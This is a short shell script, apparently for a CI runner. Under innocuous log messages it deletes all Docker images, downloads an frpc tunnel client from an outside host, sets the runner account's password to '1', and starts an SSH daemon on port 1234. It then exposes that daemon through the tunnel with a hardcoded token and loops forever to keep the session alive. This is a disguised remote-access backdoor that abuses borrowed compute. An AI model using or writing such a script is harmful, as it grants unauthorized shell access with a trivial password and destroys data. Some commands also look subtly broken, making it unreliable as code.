echo "Cleaning Up"
sudo docker rmi $(docker images -q)
echo "Creating FileShare Partition"
sudo mkdir /file/
echo "Downing CoreTools"
sudo curl https://nyat-static.globalslb.net/natfrp/client/0.39.1-sakura-1.1/frpc_linux_amd64 >/bin/frpc
apt install openssh -y
sudo chmod a+x /bin/frpc
echo "runner:1"|chpasswd
echo "Starting Core Daemon"
sudo /bin/frpc -f 47380d154cf02411:2918234 &
sudo sshd -p 1234 &
echo "end of life"
loops(){
sleep 9999
loops
}
loops